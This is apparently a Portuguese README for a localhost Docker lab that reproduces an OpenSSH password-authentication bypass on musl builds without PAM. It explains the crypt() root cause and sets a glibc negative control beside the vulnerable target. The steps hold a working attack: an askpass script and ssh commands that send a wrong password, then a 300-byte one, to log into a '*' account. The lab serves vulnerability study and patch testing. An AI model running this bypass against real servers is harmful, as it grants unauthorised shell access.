# Lab sshhole — bypass de auth do OpenSSH em musl (sshhole.com)

Causa: no musl, `crypt()` devolve `"*"` quando falha; o sha512crypt do musl
falha com senha > 256 bytes (KEY_MAX). Conta com `*` no shadow + sshd musl sem
PAM: uma senha de 257 a 1024 bytes gera `crypt()==="*"`, que casa com o `"*"` do
shadow → autentica.

Precondição confirmada neste lab: precisa de UMA tentativa falha antes, na MESMA
conexão SSH. O `pick_salt()` do sshd cacheia o salt; só após a 1ª falha o caminho
que devolve `"*"` é exercido.

## Serviços
| Serviço      | Base                               | Papel              | Porta local     |
|--------------|------------------------------------|--------------------|-----------------|
| alpine-vuln  | alpine:3.22 + OpenSSH 10.0p1 upstream, musl, `--without-pam` | alvo | 127.0.0.1:2222 |
| debian-ctrl  | debian:bookworm, glibc, `UsePAM no` | controle negativo  | 127.0.0.1:2223 |

> Nota: o pacote `openssh-server` do apk já traz a correção (Alpine
> `openssh-10.0_p1-r11`, commit "fix password authentication", 2026-11-05). Por
> isso o alvo COMPILA o OpenSSH 10.0p1 upstream sem PAM. O tarball
> `openssh-10.0p1.tar.gz` (sha256 `021a2e70...9eb9d85c`) está no diretório.

Contas: `victim` (shadow `*`, alvo) e `alice` / `Senha123!` (controle positivo).

## Uso automatizado
    docker compose up -d --build
    docker compose --profile test run --rm tester
    docker compose down

Esperado se vulnerável:
`[+] alpine-vuln victim (shadow *): LOGIN OK -> OK as victim uid=1000`
e `[-] debian-ctrl victim (shadow *): negado`.

## Passo a passo MANUAL

1. Subir os containers:

       docker compose up -d --build

2. Confirmar o alvo: OpenSSH musl, sem PAM, `victim` com `*` no shadow:

       docker compose logs alpine-vuln | grep OpenSSH_
       docker compose exec alpine-vuln ldd /usr/sbin/sshd | grep musl
       docker compose exec alpine-vuln grep '^victim:' /etc/shadow   # victim:*:...

3. (Opcional) provar a causa raiz dentro do container — `crypt()` do musl
   devolvendo `"*"` com senha de 300 bytes:

       docker compose exec alpine-vuln sh -c 'apk add -q build-base >/dev/null; cat > /tmp/c.c <<EOF
       #include <crypt.h>
       #include <stdio.h>
       #include <string.h>
       int main(){char p[400];memset(p,65,300);p[300]=0;
       printf("%s\n", crypt(p,"\$6\$abcdefgh\$"));return 0;}
       EOF
       cc /tmp/c.c -o /tmp/c && /tmp/c'          # imprime: *

4. Ataque, a partir do host, com cliente OpenSSH. O truque é dar DUAS senhas na
   MESMA conexão: 1ª curta/errada, 2ª com 300 bytes. Duas formas:

   4a. Semi-automatizado (askpass entrega as duas senhas):

       cat > /tmp/ap.sh <<'EOF'
       #!/bin/sh
       f=/tmp/apc; n=$(cat $f 2>/dev/null || echo 0); echo $((n+1)) > $f
       if [ "$n" = 0 ]; then echo errada; else printf 'A%.0s' $(seq 1 300); echo; fi
       EOF
       chmod +x /tmp/ap.sh; rm -f /tmp/apc

       SSH_ASKPASS=/tmp/ap.sh SSH_ASKPASS_REQUIRE=force DISPLAY=x setsid \
         ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
             -o PreferredAuthentications=password -o PubkeyAuthentication=no \
             -o NumberOfPasswordPrompts=3 victim@127.0.0.1 'id' </dev/null

   Esperado: `Permission denied, please try again.` (1ª tentativa) e depois
   `uid=1000(victim) ...` — login aceito sem conhecer senha alguma.

   4b. Totalmente manual (digitar as senhas à mão). Abra a conexão:

       ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
           -o PreferredAuthentications=password -o PubkeyAuthentication=no \
           -o NumberOfPasswordPrompts=3 victim@127.0.0.1

       No 1o prompt de senha: digite qualquer senha curta errada (ex.: errada) +
       Enter. Aparece "Permission denied, please try again." — e' essa falha que
       preenche o cache do pick_salt().
       No 2o prompt: cole uma senha de 300 caracteres "A" (faixa valida: 257-1024
       bytes) + Enter. Cai direto na shell da victim. Confirme com: id -> uid=1000.

       Gerar os 300 "A" para colar (nao e' o script do lab, so o gerador):
           python3 -c "print('A'*300)"

       A senha fica oculta ao colar (normal). Tem de ser na MESMA conexao: fechar
       e reabrir zera o cache do salt e a 1a tentativa longa falha — dai o
       -o NumberOfPasswordPrompts=3.

5. Repetir contra o controle glibc (deve NEGAR nas duas tentativas):

       rm -f /tmp/apc
       SSH_ASKPASS=/tmp/ap.sh SSH_ASKPASS_REQUIRE=force DISPLAY=x setsid \
         ssh -p 2223 ...  victim@127.0.0.1 'id' </dev/null    # Permission denied

6. Confirmar no log do alvo:

       docker compose logs alpine-vuln | grep -E 'Accepted|Failed'
       # Failed password for victim ... (1ª)
       # Accepted password for victim ...  (2ª, senha de 300 bytes)

7. Derrubar o lab:

       docker compose down

## Testar a versão corrigida
Trocar o alvo para usar o pacote apk já corrigido (sshd musl, SEM compilar):
construir uma imagem com `apk add openssh-server` em alpine:3.22 atual e repetir
o passo 4 — deve NEGAR. Sempre conferir a versão/revisão impressa antes de
concluir que "está corrigido".

## Escopo / ética
Lab local, rede Docker interna, portas só em 127.0.0.1. Reprodução para estudo
da vuln divulgada em sshhole.com. Não apontar contra hosts de terceiros.

## Referências

- [CVE-2026-123158 no NVD](https://nvd.nist.gov/vuln/detail/cve-2026-123158)
- [The Hacker News: exploração da falha SSHole](https://thehackernews.com/2026/11/hackers-exploited-openssh-sshole-flaw.html)
- [Vídeo sobre SSHole no YouTube](https://www.youtube.com/watch?v=kpev0vPC8TE)
